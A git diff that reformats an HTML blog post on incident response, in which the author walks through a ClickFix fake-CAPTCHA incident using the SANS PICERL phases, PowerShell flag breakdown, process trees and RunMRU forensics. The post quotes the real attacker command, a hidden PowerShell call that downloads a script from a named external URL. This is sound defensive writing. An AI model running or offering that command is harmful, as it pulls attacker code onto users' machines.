@@ -1,504 +1,769 @@
 <!doctype html>
 <html lang="en">
-<head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <meta name="description" content="A walkthrough of the SANS PICERL incident response framework applied to a real ClickFix social engineering incident — from initial alert triage to forensic analysis and lessons learned." />
-  <title>IR Framework: SANS PICERL | 18gi0n</title>
-  <link rel="preconnect" href="https://fonts.googleapis.com" />
-  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500&display=swap" rel="stylesheet" />
-  <link rel="stylesheet" href="/styles.css" />
-  <link rel="icon" type="image/x-icon" href="/assets/images/racoon.ico" />
-</head>
-<body>
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <meta
+      name="description"
+      content="A walkthrough of the SANS PICERL incident response framework applied to a real ClickFix social engineering incident — from initial alert triage to forensic analysis and lessons learned."
+    />
+    <title>IR Framework: SANS PICERL | 18gi0n</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com" />
+    <link
+      href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500&display=swap"
+      rel="stylesheet"
+    />
+    <link rel="stylesheet" href="/styles.css" />
+    <link rel="icon" type="image/x-icon" href="/assets/images/racoon.ico" />
+  </head>
+  <body>
+    <nav class="navbar">
+      <div class="nav-container">
+        <a href="/index.html" class="nav-logo">18gi0n</a>
+        <button class="nav-toggle" id="navToggle" aria-label="Toggle menu">
+          <span></span><span></span><span></span>
+        </button>
+        <ul class="nav-links" id="navLinks">
+          <li><a href="/index.html">Home</a></li>
+          <li><a href="/blog.html">Blog</a></li>
+          <li><a href="/projects.html">Projects</a></li>
+          <li><a href="/code.html">Code &amp; Tools</a></li>
+          <li><a href="/about.html">About</a></li>
+        </ul>
+      </div>
+    </nav>
 
-  <nav class="navbar">
-    <div class="nav-container">
-      <a href="/index.html" class="nav-logo">18gi0n</a>
-      <button class="nav-toggle" id="navToggle" aria-label="Toggle menu">
-        <span></span><span></span><span></span>
-      </button>
-      <ul class="nav-links" id="navLinks">
-        <li><a href="/index.html">Home</a></li>
-        <li><a href="/blog.html">Blog</a></li>
-        <li><a href="/projects.html">Projects</a></li>
-        <li><a href="/code.html">Code &amp; Tools</a></li>
-        <li><a href="/about.html">About</a></li>
+    <header class="post-header">
+      <a href="/blog.html" class="back-link">&larr; All Posts</a>
+      <h1>IR Framework: SANS PICERL</h1>
+      <div class="post-meta">
+        <span class="badge badge-blue-team">Blue Team</span>
+        <span class="reading-time" id="readingTime"></span>
+      </div>
+    </header>
+
+    <nav class="toc" id="toc">
+      <div class="toc-title">// Contents</div>
+      <ol id="tocList"></ol>
+    </nav>
+
+    <article class="post-body" id="postBody">
+      <img
+        src="/assets/images/PICERL/Title.png"
+        alt="ClickFix Campaign — Incident Report Cover"
+        style="width: 100%; border-radius: 6px; margin-bottom: 0.5rem"
+      />
+
+      <p>
+        The core incident response cycle I follow is the SANS
+        <strong>PICERL</strong> model:
+      </p>
+
+      <ol>
+        <li><strong>P</strong>reparation</li>
+        <li><strong>I</strong>dentification &amp; Scoping</li>
+        <li><strong>C</strong>ontainment / Intel Development</li>
+        <li><strong>E</strong>radication / Remediation</li>
+        <li><strong>R</strong>ecovery</li>
+        <li><strong>L</strong>essons Learned</li>
+      </ol>
+
+      <p>
+        These six steps form the foundation for the actions we execute whenever
+        a security incident is identified. Below, I'll walk through each phase
+        with examples to paint the picture.
+      </p>
+
+      <img
+        src="/assets/images/PICERL/1.png"
+        alt="Six-Step Incident Response Process Diagram"
+      />
+      <p>
+        <em
+          >This image does not reflect the actual incident but is an open source
+          image used to reenact what happened on the client environment.</em
+        >
+      </p>
+
+      <h3>Preparation</h3>
+      <ul>
+        <li>Detections/Alerting (Snort, Suricata, YARA, Sigma)</li>
+        <li>
+          Logging Infrastructure (Windows Event Logs, Linux
+          <code>/var/log</code>, NetFlow, IDS, NSM/Zeek)
+        </li>
+        <li>
+          Playbooks (Communication Plan, Escalation Criteria,
+          Isolation/Containment Procedures)
+        </li>
       </ul>
-    </div>
-  </nav>
 
-  <header class="post-header">
-    <a href="/blog.html" class="back-link">&larr; All Posts</a>
-    <h1>IR Framework: SANS PICERL</h1>
-    <div class="post-meta">
-      <span class="badge badge-blue-team">Blue Team</span>
-      <span class="reading-time" id="readingTime"></span>
-    </div>
-  </header>
+      <h3>Identification &amp; Scoping</h3>
+      <ul>
+        <li>Alert Triage</li>
+        <li>Security Event Escalation Criteria</li>
+        <li>Identifying all users/assets involved</li>
+        <li>Subnets, VLANs, Departments</li>
+      </ul>
 
-  <nav class="toc" id="toc">
-    <div class="toc-title">// Contents</div>
-    <ol id="tocList"></ol>
-  </nav>
+      <h3>Containment / Intel Development</h3>
+      <ul>
+        <li>
+          Determining the customer's priority for containment vs. intel
+          development
+        </li>
+        <li>
+          VLAN logical separation, taking the host off network, BPF host
+          isolation, EDR actions
+        </li>
+        <li>Observing attacker behavior to determine TTPs</li>
+        <li>Determining the actor's goals based on observed activity</li>
+        <li>Identifying all systems impacted</li>
+      </ul>
 
-  <article class="post-body" id="postBody">
+      <h3>Eradication / Remediation</h3>
+      <ul>
+        <li>
+          Remove any system under adversary control from the network
+          simultaneously
+        </li>
+        <li>If any compromised system is missed, return to previous steps</li>
+      </ul>
 
-    <img src="/assets/images/PICERL/Title.png" alt="ClickFix Campaign — Incident Report Cover" style="width:100%;border-radius:6px;margin-bottom:0.5rem;" />
-    <p><em>This image does not reflect the actual incident but is an open source image used to reenact what happened on the client environment.</em></p>
+      <h3>Recovery</h3>
+      <ul>
+        <li>Rebuild systems</li>
+        <li>User acceptance testing</li>
+      </ul>
 
-    <p>
-      The core incident response cycle I follow is the SANS <strong>PICERL</strong> model:
-    </p>
+      <h3>Lessons Learned / Threat Intel Consumption</h3>
+      <ul>
+        <li>Ingest threat intel gathered during the investigation</li>
+        <li>Refine playbooks and SOPs</li>
+        <li>Implement controls for any visibility gaps identified</li>
+        <li>Schedule follow-on investigation if needed</li>
+      </ul>
 
-    <ol>
-      <li><strong>P</strong>reparation</li>
-      <li><strong>I</strong>dentification &amp; Scoping</li>
-      <li><strong>C</strong>ontainment / Intel Development</li>
-      <li><strong>E</strong>radication / Remediation</li>
-      <li><strong>R</strong>ecovery</li>
-      <li><strong>L</strong>essons Learned</li>
-    </ol>
+      <hr />
 
-    <p>
-      These six steps form the foundation for the actions we execute whenever a security incident is
-      identified. Below, I'll walk through each phase with examples to paint the picture.
-    </p>
+      <h2>Executive Summary</h2>
 
-    <img src="/assets/images/PICERL/1.png" alt="Six-Step Incident Response Process Diagram" />
-    <p><em>This image does not reflect the actual incident but is an open source image used to reenact what happened on the client environment.</em></p>
+      <ul>
+        <li>
+          Defender generated a
+          <strong>High Severity – Suspicious PowerShell Activity</strong> alert
+          on an endpoint within a 20K+ device enterprise environment
+        </li>
+        <li>
+          Triage identified a hidden, non-interactive PowerShell command
+          attempting to download a remote script via
+          <code>Invoke-WebRequest</code>
+        </li>
+        <li>
+          Process tree analysis showed PowerShell spawned
+          <strong>directly from <code>explorer.exe</code></strong> — notable in
+          combination with the suspicious flags observed
+        </li>
+        <li>
+          Registry analysis (<strong>RunMRU</strong>) confirmed the command was
+          entered manually into the <strong>Windows Run box</strong>
+        </li>
+        <li>
+          Threat intel attributed the activity to the
+          <strong>ClickFix campaign</strong> — a social engineering technique
+          using fake CAPTCHA pages to trick users into pasting malicious
+          commands
+        </li>
+        <li>
+          Defender, Sysmon, and Zeek logs confirmed the
+          <strong>download was successfully blocked</strong> — no file creation,
+          no successful network connection
+        </li>
+        <li>
+          User interview and log correlation confirmed the affected user visited
+          the compromised site and was the one who pasted the command —
+          <strong
+            >no insider threat or pre-existing compromise identified</strong
+          >
+        </li>
+        <li>
+          Device was isolated, forensically imaged, and ultimately reimaged as a
+          precaution; no further indicators of compromise were found
+        </li>
+        <li>
+          Findings were used to refine SOC playbooks and train DFIR staff on
+          RunMRU analysis and ClickFix-style TTPs
+        </li>
+      </ul>
 
-    <h3>Preparation</h3>
-    <ul>
-      <li>Detections/Alerting (Snort, Suricata, YARA, Sigma)</li>
-      <li>Logging Infrastructure (Windows Event Logs, Linux <code>/var/log</code>, NetFlow, IDS, NSM/Zeek)</li>
-      <li>Playbooks (Communication Plan, Escalation Criteria, Isolation/Containment Procedures)</li>
-    </ul>
+      <hr />
 
-    <h3>Identification &amp; Scoping</h3>
-    <ul>
-      <li>Alert Triage</li>
-      <li>Security Event Escalation Criteria</li>
-      <li>Identifying all users/assets involved</li>
-      <li>Subnets, VLANs, Departments</li>
-    </ul>
+      <h2>Scenario Walkthrough</h2>
 
-    <h3>Containment / Intel Development</h3>
-    <ul>
-      <li>Determining the customer's priority for containment vs. intel development</li>
-      <li>VLAN logical separation, taking the host off network, BPF host isolation, EDR actions</li>
-      <li>Observing attacker behavior to determine TTPs</li>
-      <li>Determining the actor's goals based on observed activity</li>
-      <li>Identifying all systems impacted</li>
-    </ul>
+      <p>
+        Now that we've covered the high-level framework, I want to walk through
+        a scenario where I executed this process in practice.
+      </p>
 
-    <h3>Eradication / Remediation</h3>
-    <ul>
-      <li>Remove any system under adversary control from the network simultaneously</li>
-      <li>If any compromised system is missed, return to previous steps</li>
-    </ul>
+      <blockquote>
+        <strong>Note:</strong> The screenshots used in this write-up do not
+        reflect my actual environment or its logs — they're pulled from public
+        reporting on the same malware campaign for illustrative purposes. The
+        scenario itself, however, is based on an actual incident I led and
+        responded to, recreated here as accurately as I can for this write-up.
+        This isn't a sophisticated APT-level intrusion — it's a realistic
+        example of the kind of day-to-day alert triage and incident response
+        work a SOC handles regularly.
+      </blockquote>
 
-    <h3>Recovery</h3>
-    <ul>
-      <li>Rebuild systems</li>
-      <li>User acceptance testing</li>
-    </ul>
+      <p>
+        <strong>Environment:</strong> Large enterprise, 20,000+ endpoints
+        (Windows/Linux) spread across multiple global sites. We run Microsoft
+        Defender for endpoint protection and Sentinel for log aggregation/alert
+        triage.
+      </p>
 
-    <h3>Lessons Learned / Threat Intel Consumption</h3>
-    <ul>
-      <li>Ingest threat intel gathered during the investigation</li>
-      <li>Refine playbooks and SOPs</li>
-      <li>Implement controls for any visibility gaps identified</li>
-      <li>Schedule follow-on investigation if needed</li>
-    </ul>
+      <p>
+        <strong>Trigger:</strong> While conducting alert triage in Defender, I
+        observed an alert for <strong>Suspicious PowerShell Activity</strong> on
+        an endpoint.
+      </p>
 
-    <hr />
+      <h2>1. Preparation</h2>
 
-    <h2>Executive Summary</h2>
+      <p>
+        Technically we're already past this phase by the time an alert fires,
+        but it's worth noting what was already in place that came into play
+        later in the process: our isolation/escalation playbooks were available
+        and up to date, and the on-call roster was current.
+      </p>
 
-    <ul>
-      <li>Defender generated a <strong>High Severity – Suspicious PowerShell Activity</strong> alert on an endpoint within a 20K+ device enterprise environment</li>
-      <li>Triage identified a hidden, non-interactive PowerShell command attempting to download a remote script via <code>Invoke-WebRequest</code></li>
-      <li>Process tree analysis showed PowerShell spawned <strong>directly from <code>explorer.exe</code></strong> — notable in combination with the suspicious flags observed</li>
-      <li>Registry analysis (<strong>RunMRU</strong>) confirmed the command was entered manually into the <strong>Windows Run box</strong></li>
-      <li>Threat intel attributed the activity to the <strong>ClickFix campaign</strong> — a social engineering technique using fake CAPTCHA pages to trick users into pasting malicious commands</li>
-      <li>Defender, Sysmon, and Zeek logs confirmed the <strong>download was successfully blocked</strong> — no file creation, no successful network connection</li>
-      <li>User interview and log correlation confirmed the affected user visited the compromised site and was the one who pasted the command — <strong>no insider threat or pre-existing compromise identified</strong></li>
-      <li>Device was isolated, forensically imaged, and ultimately reimaged as a precaution; no further indicators of compromise were found</li>
-      <li>Findings were used to refine SOC playbooks and train DFIR staff on RunMRU analysis and ClickFix-style TTPs</li>
-    </ul>
+      <h2>2. Identification &amp; Scoping</h2>
 
-    <hr />
+      <h3>a. Initial Alert</h3>
 
-    <h2>Scenario Walkthrough</h2>
+      <p>
+        Initial notification came in through Microsoft Defender as a host-based
+        alert for suspicious PowerShell activity.
+      </p>
 
-    <p>
-      Now that we've covered the high-level framework, I want to walk through a scenario where I executed
-      this process in practice.
-    </p>
+      <p>
+        These alerts aren't uncommon in a large enterprise — we have sysadmins
+        and engineers running PowerShell scripts for automation and deployments,
+        including routine scheduled CIM-based queries against workstations. So
+        the first step is always <strong>verification</strong>: review the alert
+        content, validate the detection criteria, and make an initial assessment
+        of how suspicious it actually is.
+      </p>
 
-    <blockquote>
-      <strong>Note:</strong> The screenshots used in this write-up do not reflect my actual environment
-      or its logs — they're pulled from public reporting on the same malware campaign for illustrative
-      purposes. The scenario itself, however, is based on an actual incident I led and responded to,
-      recreated here as accurately as I can for this write-up. This isn't a sophisticated APT-level
-      intrusion — it's a realistic example of the kind of day-to-day alert triage and incident response
-      work a SOC handles regularly.
-    </blockquote>
+      <img
+        src="/assets/images/PICERL/2.png"
+        alt="Defender Security Alert — Suspicious PowerShell Activity"
+      />
+      <p>
+        <em
+          >This image does not reflect the actual incident but is an open source
+          image used to reenact what happened on the client environment.</em
+        >
+      </p>
 
-    <p>
-      <strong>Environment:</strong> Large enterprise, 20,000+ endpoints (Windows/Linux) spread across
-      multiple global sites. We run Microsoft Defender for endpoint protection and Sentinel for log
-      aggregation/alert triage.
-    </p>
+      <h3>b. Command Line Review</h3>
 
-    <p>
-      <strong>Trigger:</strong> While conducting alert triage in Defender, I observed an alert for
-      <strong>Suspicious PowerShell Activity</strong> on an endpoint.
-    </p>
+      <p>
+        In this case, I looked at the PowerShell arguments first. Inside the
+        command line, I saw an
+        <code>Invoke-WebRequest</code> cmdlet reaching out to a web URL to
+        retrieve a PowerShell script. The command observed was:
+      </p>
 
-    <h2>1. Preparation</h2>
+      <pre><code>powershell.exe -w hidden -c "iwr 'https://yogasitesdev.wpengine.com/2/15.ps1'"</code></pre>
 
-    <p>
-      Technically we're already past this phase by the time an alert fires, but it's worth noting what
-      was already in place that came into play later in the process: our isolation/escalation playbooks
-      were available and up to date, and the on-call roster was current.
-    </p>
+      <p>Breaking the command down:</p>
 
-    <h2>2. Identification &amp; Scoping</h2>
+      <ul>
+        <li>
+          <code>-w hidden</code> — opens PowerShell in a hidden window,
+          invisible to the user
+        </li>
+        <li>
+          <code>-c</code> — passes everything that follows as a command to
+          execute in that hidden window
+        </li>
+        <li>
+          <code>iwr</code> — alias for <code>Invoke-WebRequest</code>,
+          functionally similar to <code>curl</code> or <code>wget</code> — used
+          to retrieve data over HTTP
+        </li>
+      </ul>
 
-    <h3>a. Initial Alert</h3>
+      <img
+        src="/assets/images/PICERL/3.png"
+        alt="Command line highlighting -w hidden and iwr flags"
+      />
+      <p>
+        <em
+          >This image does not reflect the actual incident but is an open source
+          image used to reenact what happened on the client environment.</em
+        >
+      </p>
 
-    <p>
-      Initial notification came in through Microsoft Defender as a host-based alert for suspicious
-      PowerShell activity.
-    </p>
+      <p>
+        None of this is normal admin behavior. There's very little legitimate
+        reason an admin would want to silently download something from an
+        external site in a hidden window where they couldn't even monitor
+        progress. If an admin <em>was</em> doing this intentionally, that
+        activity itself would need to be reviewed and explained.
+      </p>
 
-    <p>
-      These alerts aren't uncommon in a large enterprise — we have sysadmins and engineers running
-      PowerShell scripts for automation and deployments, including routine scheduled CIM-based queries
-      against workstations. So the first step is always <strong>verification</strong>: review the alert
-      content, validate the detection criteria, and make an initial assessment of how suspicious it
-      actually is.
-    </p>
+      <p>
+        <strong>Finding:</strong> I determined the command to be a true positive
+        and escalated the alert to a full security incident, looping in the SOC
+        team to execute the IR playbook. We started an investigation timeline at
+        this point, noting the time of alert, time of log, and time of command
+        execution.
+      </p>
 
-    <img src="/assets/images/PICERL/2.png" alt="Defender Security Alert — Suspicious PowerShell Activity" />
-    <p><em>This image does not reflect the actual incident but is an open source image used to reenact what happened on the client environment.</em></p>
+      <h3>c. Scoping</h3>
 
-    <h3>b. Command Line Review</h3>
+      <p>
+        With the determination made that this was worth investigating, I moved
+        into scoping. Scoping involves answering the "who" and "what" —
+        gathering all available host information tied to the alert. Key
+        questions I ask when scoping a device:
+      </p>
 
-    <p>
-      In this case, I looked at the PowerShell arguments first. Inside the command line, I saw an
-      <code>Invoke-WebRequest</code> cmdlet reaching out to a web URL to retrieve a PowerShell script.
-      The command observed was:
-    </p>
+      <ul>
+        <li>Hostname, IP, MAC address, subnet, department, purpose</li>
+        <li>Assigned user / last user logged in</li>
+        <li>
+          Any previous alerts on this device (is this a trend, or are we seeing
+          the middle of a kill chain?)
+        </li>
+        <li>
+          Any similar suspicious PowerShell alerts across the environment in the
+          last 14 days?
+        </li>
+      </ul>
 
-    <pre><code>powershell.exe -w hidden -c "iwr 'https://yogasitesdev.wpengine.com/2/15.ps1'"</code></pre>
+      <img
+        src="/assets/images/PICERL/4.png"
+        alt="Defender Device Inventory / Scoping View"
+      />
+      <p>
+        <em
+          >This image does not reflect the actual incident but is an open source
+          image used to reenact what happened on the client environment.</em
+        >
+      </p>
 
-    <p>Breaking the command down:</p>
+      <p>
+        Once host information was gathered and all systems related to the alert
+        were scoped, we moved to the next phase.
+      </p>
 
-    <ul>
-      <li><code>-w hidden</code> — opens PowerShell in a hidden window, invisible to the user</li>
-      <li><code>-c</code> — passes everything that follows as a command to execute in that hidden window</li>
-      <li><code>iwr</code> — alias for <code>Invoke-WebRequest</code>, functionally similar to <code>curl</code> or <code>wget</code> — used to retrieve data over HTTP</li>
-    </ul>
+      <h2>3. Containment / Intel Development</h2>
 
-    <img src="/assets/images/PICERL/3.png" alt="Command line highlighting -w hidden and iwr flags" />
-    <p><em>This image does not reflect the actual incident but is an open source image used to reenact what happened on the client environment.</em></p>
+      <h3>a. Containment Decision</h3>
 
-    <p>
-      None of this is normal admin behavior. There's very little legitimate reason an admin would want
-      to silently download something from an external site in a hidden window where they couldn't even
-      monitor progress. If an admin <em>was</em> doing this intentionally, that activity itself would
-      need to be reviewed and explained.
-    </p>
+      <p>
+        This phase is always a balancing act. The instinctive reaction from most
+        customers is "isolate the device immediately" — which is a completely
+        valid response. But it's worth asking (and presenting to the customer):
+        what if the attacker is mid-process, downloading additional tooling or
+        establishing a backdoor? Isolating too early can tip them off that we're
+        onto them, when a brief tactical pause could let us observe and log
+        additional traffic — what files are being accessed, what's normal
+        activity on this device, can we correlate the suspicious activity to a
+        specific timeframe, is there a pattern in the resources being targeted
+        (file servers, databases, etc.)? Even a 24-hour observation window can
+        significantly help downstream during eradication and recovery.
+      </p>
 
-    <p>
-      <strong>Finding:</strong> I determined the command to be a true positive and escalated the alert
-      to a full security incident, looping in the SOC team to execute the IR playbook. We started an
-      investigation timeline at this point, noting the time of alert, time of log, and time of command
-      execution.
-    </p>
+      <p>
+        To be clear — this isn't "let the attacker run free." We can still apply
+        mitigating controls while observing and collecting intel:
+      </p>
 
-    <h3>c. Scoping</h3>
+      <ul>
+        <li>Restrict the subnet to a separate section of the network</li>
+        <li>Deploy a honeypot</li>
+        <li>
+          Place the device on a restricted VLAN that allows internet access but
+          limits what it can reach
+        </li>
+      </ul>
 
-    <p>
-      With the determination made that this was worth investigating, I moved into scoping. Scoping
-      involves answering the "who" and "what" — gathering all available host information tied to the
-      alert. Key questions I ask when scoping a device:
-    </p>
+      <p>
+        There are a number of ways to mitigate risk while still gathering intel
+        — but ultimately, this decision comes down to the customer's risk
+        appetite for the situation.
+      </p>
 
-    <ul>
-      <li>Hostname, IP, MAC address, subnet, department, purpose</li>
-      <li>Assigned user / last user logged in</li>
-      <li>Any previous alerts on this device (is this a trend, or are we seeing the middle of a kill chain?)</li>
-      <li>Any similar suspicious PowerShell alerts across the environment in the last 14 days?</li>
-    </ul>
+      <h3>b. Isolation &amp; Forensic Collection</h3>
 
-    <img src="/assets/images/PICERL/4.png" alt="Defender Device Inventory / Scoping View" />
-    <p><em>This image does not reflect the actual incident but is an open source image used to reenact what happened on the client environment.</em></p>
+      <p>
+        <strong>In this case, the customer wanted immediate isolation.</strong>
+        I created an ITSM ticket for documentation and coordinated with the
+        network operations team to place the device on an isolated VLAN. We
+        identified the user active on the device at the time of the alert and
+        used the company directory to locate their building, correlating it to
+        the device's registered location. Once isolation was confirmed, I sent
+        myself and another team member onsite to conduct forensic collection.
+      </p>
 
-    <p>
-      Once host information was gathered and all systems related to the alert were scoped, we moved to
-      the next phase.
-    </p>
+      <p>
+        We escalated to leadership, who coordinated with HR to have the user
+        step away from the device — while leaving it powered on and in its
+        current state to preserve forensic value. Onsite, we collected memory
+        and a triage image using <strong>DumpIt</strong> and
+        <strong>KAPE</strong> (see the
+        <a href="/webpages/win_for_anaylsis.html"
+          >Windows Forensic Collection</a
+        >
+        post for a walkthrough of these tools), then powered down the device,
+        completed chain-of-custody documentation, and brought it back to the SOC
+        for a full bit-by-bit disk image.
+      </p>
 
-    <h2>3. Containment / Intel Development</h2>
+      <img
+        src="/assets/images/PICERL/7.png"
+        alt="Detecting Compromised Endpoints without Active Malware — Forensic Artifact Reference Table"
+      />
+      <p>
+        <em
+          >This image does not reflect the actual incident but is an open source
+          image used to reenact what happened on the client environment.</em
+        >
+      </p>
 
-    <h3>a. Containment Decision</h3>
+      <h3>c. Team Roles</h3>
 
-    <p>
-      This phase is always a balancing act. The instinctive reaction from most customers is "isolate the
-      device immediately" — which is a completely valid response. But it's worth asking (and presenting
-      to the customer): what if the attacker is mid-process, downloading additional tooling or
-      establishing a backdoor? Isolating too early can tip them off that we're onto them, when a brief
-      tactical pause could let us observe and log additional traffic — what files are being accessed,
-      what's normal activity on this device, can we correlate the suspicious activity to a specific
-      timeframe, is there a pattern in the resources being targeted (file servers, databases, etc.)?
-      Even a 24-hour observation window can significantly help downstream during eradication and
-      recovery.
-    </p>
+      <p>Back at the SOC, we split investigative efforts:</p>
 
-    <p>
-      To be clear — this isn't "let the attacker run free." We can still apply mitigating controls
-      while observing and collecting intel:
-    </p>
+      <ul>
+        <li>
+          <strong>Triage analysts</strong> continued standard CONMON (continuous
+          monitoring) duties
+        </li>
+        <li>
+          <strong>Senior analyst</strong> pivoted to network artifact review,
+          prioritizing communication to/from the device
+        </li>
+        <li>
+          <strong>Threat intel analyst</strong> was assigned IOC/TTP research —
+          domain analysis (age, owner, ASN, CDN) and known TTPs for PowerShell
+          misuse tied to the domain in question
+        </li>
+        <li>
+          <strong>Incident handlers</strong> (myself included) focused on the
+          customer's top question: was this a malicious actor who had
+          compromised the box, an insider threat, or malware?
+        </li>
+      </ul>
 
-    <ul>
-      <li>Restrict the subnet to a separate section of the network</li>
-      <li>Deploy a honeypot</li>
-      <li>Place the device on a restricted VLAN that allows internet access but limits what it can reach</li>
-    </ul>
+      <p>
+        The first thing we did was review PowerShell logs for other signs of
+        malicious command activity before or after this execution. We found
+        nothing in any user profile — which made sense once we determined the
+        activity was <strong>non-interactive</strong> (more on that below).
+      </p>
 
-    <p>
-      There are a number of ways to mitigate risk while still gathering intel — but ultimately, this
-      decision comes down to the customer's risk appetite for the situation.
-    </p>
+      <h3>d. Process Analysis</h3>
 
-    <h3>b. Isolation &amp; Forensic Collection</h3>
+      <p>
+        We pivoted to process analysis, running the memory image through
+        <strong>MemProcFS</strong> to pull the parent process tree and examine
+        how PowerShell was actually launched.
+      </p>
 
-    <p>
-      <strong>In this case, the customer wanted immediate isolation.</strong> I created an ITSM ticket
-      for documentation and coordinated with the network operations team to place the device on an
-      isolated VLAN. We identified the user active on the device at the time of the alert and used the
-      company directory to locate their building, correlating it to the device's registered location.
-      Once isolation was confirmed, I sent myself and another team member onsite to conduct forensic
-      collection.
-    </p>
-
-    <p>
-      We escalated to leadership, who coordinated with HR to have the user step away from the device —
-      while leaving it powered on and in its current state to preserve forensic value. Onsite, we
-      collected memory and a triage image using <strong>DumpIt</strong> and <strong>KAPE</strong>
-      (see the <a href="/webpages/win_for_anaylsis.html">Windows Forensic Collection</a> post for a
-      walkthrough of these tools), then powered down the device, completed chain-of-custody
-      documentation, and brought it back to the SOC for a full bit-by-bit disk image.
-    </p>
-
-    <img src="/assets/images/PICERL/7.png" alt="Detecting Compromised Endpoints without Active Malware — Forensic Artifact Reference Table" />
-    <p><em>This image does not reflect the actual incident but is an open source image used to reenact what happened on the client environment.</em></p>
-
-    <h3>c. Team Roles</h3>
-
-    <p>Back at the SOC, we split investigative efforts:</p>
-
-    <ul>
-      <li><strong>Triage analysts</strong> continued standard CONMON (continuous monitoring) duties</li>
-      <li><strong>Senior analyst</strong> pivoted to network artifact review, prioritizing communication to/from the device</li>
-      <li><strong>Threat intel analyst</strong> was assigned IOC/TTP research — domain analysis (age, owner, ASN, CDN) and known TTPs for PowerShell misuse tied to the domain in question</li>
-      <li><strong>Incident handlers</strong> (myself included) focused on the customer's top question: was this a malicious actor who had compromised the box, an insider threat, or malware?</li>
-    </ul>
-
-    <p>
-      The first thing we did was review PowerShell logs for other signs of malicious command activity
-      before or after this execution. We found nothing in any user profile — which made sense once we
-      determined the activity was <strong>non-interactive</strong> (more on that below).
-    </p>
-
-    <h3>d. Process Analysis</h3>
-
-    <p>
-      We pivoted to process analysis, running the memory image through <strong>MemProcFS</strong> to
-      pull the parent process tree and examine how PowerShell was actually launched.
-    </p>
-
-<pre><code>explorer.exe
+      <pre><code>explorer.exe
 └── powershell.exe</code></pre>
 
-    <p>
-      On its own, <code>explorer.exe</code> → <code>powershell.exe</code> isn't a smoking gun —
-      a legitimate admin manually launching PowerShell via Win+R produces the exact same parent-child
-      relationship. What made this noteworthy was the <strong>combination</strong>: that process
-      tree <em>plus</em> the command-line flags we'd already identified (<code>-w hidden</code>,
-      <code>-c iwr</code> reaching an external URL). A hidden, outbound-downloading PowerShell
-      spawned directly from <code>explorer.exe</code> with no scheduled-task or service host in
-      the chain — that's the full picture that warranted attention.
-    </p>
+      <p>
+        On its own, <code>explorer.exe</code> →
+        <code>powershell.exe</code> isn't a smoking gun — a legitimate admin
+        manually launching PowerShell via Win+R produces the exact same
+        parent-child relationship. What made this noteworthy was the
+        <strong>combination</strong>: that process tree <em>plus</em> the
+        command-line flags we'd already identified (<code>-w hidden</code>,
+        <code>-c iwr</code> reaching an external URL). A hidden,
+        outbound-downloading PowerShell spawned directly from
+        <code>explorer.exe</code> with no scheduled-task or service host in the
+        chain — that's the full picture that warranted attention.
+      </p>
 
-    <p>
-      For context: automated PowerShell activity from a scheduled task would typically chain from
-      <code>svchost.exe</code>. A user launching PowerShell through the Start menu search would
-      produce an intermediate process:
-    </p>
+      <p>
+        For context: automated PowerShell activity from a scheduled task would
+        typically chain from
+        <code>svchost.exe</code>. A user launching PowerShell through the Start
+        menu search would produce an intermediate process:
+      </p>
 
-<pre><code>explorer.exe
+      <pre><code>explorer.exe
 └── SearchApp.exe (or SearchUI.exe on older builds)
     └── powershell.exe</code></pre>
 
-    <p>
-      The absence of any intermediate host process — combined with the suspicious flags — made
-      <strong>Run box (Win+R) usage</strong> the most likely explanation, which we then moved to
-      confirm via the registry rather than treating it as concluded.
-    </p>
+      <p>
+        The absence of any intermediate host process — combined with the
+        suspicious flags — made
+        <strong>Run box (Win+R) usage</strong> the most likely explanation,
+        which we then moved to confirm via the registry rather than treating it
+        as concluded.
+      </p>
 
-    <img src="/assets/images/PICERL/5.png" alt="Windows Run Dialog" />
-    <p><em>This image does not reflect the actual incident but is an open source image used to reenact what happened on the client environment.</em></p>
+      <img src="/assets/images/PICERL/5.png" alt="Windows Run Dialog" />
+      <p>
+        <em
+          >This image does not reflect the actual incident but is an open source
+          image used to reenact what happened on the client environment.</em
+        >
+      </p>
 
-    <p>To confirm, we pivoted to the <strong>RunMRU</strong> registry key, extracted from the KAPE image:</p>
+      <p>
+        To confirm, we pivoted to the <strong>RunMRU</strong> registry key,
+        extracted from the KAPE image:
+      </p>
 
-<pre><code>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU</code></pre>
+      <pre><code>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU</code></pre>
 
-    <p>
-      (RunMRU = "Most Recently Used" — tracking commands entered into the Windows Run box.)
-    </p>
+      <p>
+        (RunMRU = "Most Recently Used" — tracking commands entered into the
+        Windows Run box.)
+      </p>
 
-    <img src="/assets/images/PICERL/6.png" alt="RunMRU Registry Key — Most Recently Used Commands" />
-    <p><em>This image does not reflect the actual incident but is an open source image used to reenact what happened on the client environment.</em></p>
+      <img
+        src="/assets/images/PICERL/6.png"
+        alt="RunMRU Registry Key — Most Recently Used Commands"
+      />
+      <p>
+        <em
+          >This image does not reflect the actual incident but is an open source
+          image used to reenact what happened on the client environment.</em
+        >
+      </p>
 
-    <p>
-      By comparing the <code>MRUList</code> value stored in the same key, we could determine execution
-      order — and in this case, the most recent entry matched the suspicious PowerShell command that
-      triggered the alert.
-    </p>
+      <p>
+        By comparing the <code>MRUList</code> value stored in the same key, we
+        could determine execution order — and in this case, the most recent
+        entry matched the suspicious PowerShell command that triggered the
+        alert.
+      </p>
 
-    <p>
-      This also explained why we hadn't found anything in PowerShell's interactive command history: a
-      command launched via the Run box as a process argument (<code>-c</code>/<code>-enc</code>) is
-      <strong>never treated as an interactive session</strong>, so it never gets logged to
-      <code>ConsoleHost_history.txt</code>. The SOC team was able to independently confirm the activity
-      via the Windows Event Log PowerShell channel — Script Block Logging (Event ID <strong>4104</strong>)
-      showed the activity on the host, but no other signs of compromise before or after.
-    </p>
+      <p>
+        This also explained why we hadn't found anything in PowerShell's
+        interactive command history: a command launched via the Run box as a
+        process argument (<code>-c</code>/<code>-enc</code>) is
+        <strong>never treated as an interactive session</strong>, so it never
+        gets logged to <code>ConsoleHost_history.txt</code>. The SOC team was
+        able to independently confirm the activity via the Windows Event Log
+        PowerShell channel — Script Block Logging (Event ID
